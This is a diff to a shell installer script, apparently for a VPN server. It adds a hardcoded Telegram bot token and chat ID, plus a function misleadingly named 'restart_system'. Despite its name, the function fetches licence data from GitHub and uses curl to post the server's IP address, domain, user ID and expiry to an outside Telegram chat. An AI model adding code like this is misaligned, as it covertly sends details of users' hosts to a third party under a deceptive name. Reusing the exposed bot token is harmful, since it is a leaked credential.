@@ -17,7 +17,10 @@ GRAY="\e[1;30m"
 NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
-
+TIMES="10"
+CHATID="-1002015199453"
+KEY="6409879237:AAE1vPwbqfiWmRkV-AbCa6-tepM5w5FTGz0"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 # ===================
 clear
   # // Exporint IP AddressInformation
@@ -306,7 +309,26 @@ clear
 
 clear
 #GANTI PASSWORD DEFAULT
-
+restart_system() {
+    USRSC=$(wget -qO- https://raw.githubusercontent.com/myvpn1/izin/main/ip | grep $ipsaya | awk '{print $2}')
+    EXPSC=$(wget -qO- https://raw.githubusercontent.com/myvpn1/izin/main/ip | grep $ipsaya | awk '{print $3}')
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
+    TEXT="
+<code>────────────────────</code>
+<b>⚡AUTOSCRIPT PREMIUM⚡</b>
+<code>────────────────────</code>
+<code>ID     : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIME</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$ipsaya</code>
+<code>PW vps : </code><code>ISI</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+<code>────────────────────</code>
+<i>Automatic Notification from Github</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"ORDER🐳","url":"https://t.me/AndyYudaKLMPK"},{"text":"GROUP🐬","url":"https://chat.whatsapp.com/IMwXEDPHxatHBg9bOk7iME"}]]}'
+    curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
 clear
 # Pasang SSL
 function pasang_ssl() {
